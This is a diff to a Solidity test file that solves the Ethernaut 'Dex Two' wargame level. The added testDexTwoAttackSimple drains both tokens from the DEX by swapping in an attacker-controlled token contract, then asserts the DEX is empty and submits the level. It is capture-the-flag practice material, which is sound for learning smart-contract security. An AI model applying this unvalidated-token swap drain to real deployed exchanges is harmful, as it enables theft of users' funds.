@@ -28,11 +28,13 @@ contract DexTwoAttackTest is PRBTest {
 
         ethernaut.registerLevel(factory);
         dextwoInstance = ethernaut.createLevelInstance(factory);
-        // create attacker with dextwo instance address
-        attacker = new DexTwoAttack(dextwoInstance, playerAddress);
+
         // extract dex native tokens
         token1 = DexTwo(dextwoInstance).token1();
         token2 = DexTwo(dextwoInstance).token2();
+
+        // create attacker with dextwo instance address
+        attacker = new DexTwoAttack(dextwoInstance, playerAddress);
         vm.stopPrank();
     }
 
@@ -59,6 +61,33 @@ contract DexTwoAttackTest is PRBTest {
 
         // swap out the token with a balance with our attacker token
         DexTwo(dextwoInstance).swap(address(attacker), tokenWithDexBalance, tokenWithDexBalanceBalance);
+
+        // assert that we've wiped all tokens from the dex
+        assert(isDexFullyDrained());
+
+
+        // // test to make sure we completed the level; submit level as player
+        bool levelComplete = ethernaut.submitLevelInstance(payable(dextwoInstance));
+        assert(levelComplete);
+        vm.stopPrank();
+    }
+
+    function testDexTwoAttackSimple() public {
+        uint256 tokenBalance;
+        uint256 exchangeBalance;
+        bool toggle;
+        bool drained;
+
+        vm.startPrank(playerAddress, playerAddress);
+
+
+        // swap out the token with a balance with our attacker token
+        attacker.tokenToDrain(token1);
+        DexTwo(dextwoInstance).swap(address(attacker), token1, SwappableTokenTwo(token1).balanceOf(dextwoInstance));
+
+        attacker.tokenToDrain(token2);
+        // swap out the token with a balance with our attacker token
+        DexTwo(dextwoInstance).swap(address(attacker), token2, SwappableTokenTwo(token2).balanceOf(dextwoInstance));
 
         // assert that we've wiped all tokens from the dex
         assert(isDexFullyDrained());
